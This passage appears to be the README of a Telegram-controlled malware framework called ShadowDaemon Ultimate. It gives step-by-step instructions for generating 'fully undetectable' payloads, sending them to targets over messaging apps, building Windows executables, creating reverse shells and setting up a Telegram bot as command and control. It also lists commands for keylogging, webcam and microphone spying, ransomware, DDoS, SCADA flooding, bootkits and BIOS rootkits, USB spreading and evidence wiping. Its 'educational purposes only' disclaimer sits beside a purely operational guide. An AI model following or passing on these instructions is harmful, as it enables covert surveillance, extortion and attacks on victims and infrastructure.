## 🚀 PAYLOAD GENERATION

### Generate FUD Payload

```bash
# Generate payload
gen_payload

# Output: payload_xxxxxx.py
# This file is encrypted and FUD (Fully Undetectable)
```

### Send to Target

```bash
# 1. Send via Telegram/WhatsApp
# 2. Target downloads and runs:
python3 payload_xxxxxx.py

# 3. Malware is active, you can control via Telegram!
```

### Create .exe (Windows)

```bash
# Install pyinstaller
pip install pyinstaller

# Create .exe
pyinstaller --onefile --noconsole payload_xxxxxx.py

# Result: dist/payload_xxxxxx.exe
# Send to Windows target
```

### Generate Reverse Shell

```bash
# Generate reverse shell
gen_reverse:192.168.1.100:4444

# Output: reverse_shell.py
# Run on target:
python3 reverse_shell.py
```

---

## 🤖 TELEGRAM BOT SETUP

### Step 1: Create Bot

```
Open Telegram → Search @BotFather → Send /newbot
→ Name: ShadowDaemonBot
→ Username: ShadowDaemon_bot
→ Copy TOKEN
```

### Step 2: Get Chat ID

```
Send message to your bot
Visit: https://api.telegram.org/bot<TOKEN>/getUpdates
Find "chat":{"id": 123456789}
```

### Step 3: Update Config

```json
"telegram_token": "YOUR_BOT_TOKEN_FROM_BOTFATHER",
"telegram_chat_id": "YOUR_CHAT_ID"
```

### Step 4: Test Bot

```bash
curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage" -d "chat_id=<CHAT_ID>&text=ShadowDaemon%20active!"
```

### Step 5: Set Commands

```
/setcommands
```

**Copy-paste:**
```
info - Show system information
help - Show all available commands
shell - Execute shell command on target
screenshot - Take screenshot of target screen
webcam - Capture webcam image
mic - Record microphone (10 seconds)
record_screen - Record screen (30 seconds)
keylog_start - Start keylogger
keylog_stop - Stop keylogger
keylog_get - Get captured keystrokes
ransomware - Encrypt files with AES-256
ddos - DDoS attack on target IP
knock - Port knocking to bypass firewall
network_exploit - Network exploitation attack
industrial_flood - Flood industrial/SCADA protocols
miner_start - Start cryptocurrency mining
miner_stop - Stop cryptocurrency mining
persist - Install persistence (auto-start)
hide_self - Hide process from task manager
wipe_trails - Wipe forensic evidence
usb_spread - Auto-infect USB drives
setup_usb_keylogger - Setup hardware keylogger
create_ducky - Generate USB Rubber Ducky payload
install_bootkit - Infect bootloader (GRUB/Syslinux)
install_bios_rootkit - Infect BIOS/UEFI firmware
install_cpu_backdoor - CPU microcode backdoor injection
trigger_smm - Trigger SMM (System Management Mode) backdoor
scan_plc - Scan for PLC/SCADA devices
stuxnet - Deploy Stuxnet-style payload
gen_payload - Generate FUD payload
crypt_binary - Encrypt binary file
mouse - Control mouse remotely
type - Type text remotely
selfdestruct - Self-destruct malware
```

---

## 🐛 TROUBLESHOOTING

### Common Issues

#### ModuleNotFoundError
```bash
pip install -r requirements.txt
```

#### Permission Denied (/tmp)
```bash
# Create file in project folder
touch .shadow_key
chmod 666 .shadow_key
```

#### JSONDecodeError
```bash
# Create new config.json
cat > config.json << 'EOF'
{
    "c2_type": "telegram",
    "telegram_token": "YOUR_TOKEN",
    "telegram_chat_id": "YOUR_CHAT_ID",
    ...
}
EOF
```

#### Cannot Connect to Telegram
- Check internet connection
- Verify token in config.json
- Check bot is not blocked

#### Kernel Module Won't Load
```bash
sudo apt install linux-headers-$(uname -r)
cd kernel && make
```

#### Command Not Found
- Make sure module file exists in `modules/`
- Check `modules/__init__.py` imports
- Restart ShadowDaemon

#### bcrypt/pynacl Build Failed (Termux)
```bash
pkg install python-bcrypt python-pynacl python-paramiko -y
```

#### Arduino Not Detected
```bash
# Check connection
lsusb

# Check permissions
sudo chmod 666 /dev/ttyUSB0

# On Termux
ls /dev/ttyUSB*
```

---

## ❓ FAQ

### Q: What is ShadowDaemon Ultimate?
**A:** A complete malware framework for Linux/Termux with 100+ modules from basic to AI-based attacks.

### Q: Is this illegal?
**A:** Yes, if used without authorization. For educational and self-testing only.

### Q: How to setup Telegram bot?
**A:** Search @BotFather on Telegram, create bot, copy token, and get chat ID from getUpdates.

### Q: Can it run on Windows?
**A:** No, Linux only. But payloads can target Windows (Rubber Ducky, exe builder).

### Q: How much does hardware keylogger cost?
**A:** Rp 50-300k for Arduino/Teensy.

### Q: Is kernel rootkit dangerous?
**A:** Yes, can crash or brick the system. Only for lab testing.

### Q: How to update ShadowDaemon?
**A:** Use command `auto_update` or `git pull` and restart.

### Q: Why some commands don't work on Termux?
**A:** Some features need hardware (screenshot, webcam) or root (kernel module, bootkit).

### Q: What is the difference between Arduino Nano and Leonardo?
**A:** Nano is for keylogger, Leonardo is for USB Rubber Ducky (has keyboard emulation).

---

## ⚠️ FINAL WARNING

```
╔═══════════════════════════════════════════════════════════════╗
║                      ⚠️  WARNING  ⚠️                         ║
║                                                               ║
║  This tool is intended for EDUCATIONAL PURPOSES only.        ║
║  Using this tool against systems without authorization       ║
║  is ILLEGAL and can result in severe penalties.              ║
║                                                               ║
║  By using this tool, you agree to:                           ║
║  1. Use it only on systems you own                           ║
║  2. Use it only for legitimate security testing              ║
║  3. Accept full responsibility for your actions              ║
║  4. Not hold the author responsible for any misuse           ║
║                                                               ║
║  🔒 STAY SAFE, STAY LEGAL 🔒                                 ║
╚═══════════════════════════════════════════════════════════════╝
```

---

## 📜 LICENSE

This project is licensed under the **MIT License**.

```
MIT License

Copyright (c) 2026 イズミー

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## ⭐ STAR US

If you find this project useful, please give it a star on GitHub!

[![GitHub stars](https://img.shields.io/github/stars/hidayat-tanjung/ShadowDaemon_Ultimate.svg?style=social&label=Star)](https://github.com/hidayat-tanjung/ShadowDaemon_Ultimate)

---

<div align="center">
  <sub>Built with 🔥 by イズミー</sub>
  <br>
  <sub>© 2026 ShadowDaemon Ultimate Edition v4.0</sub>
  <br>
  <sub>⚠️ For Educational Purposes Only ⚠️</sub>
  <br>
  <sub>Linux is freedom. Knowledge is power.</sub>
</div>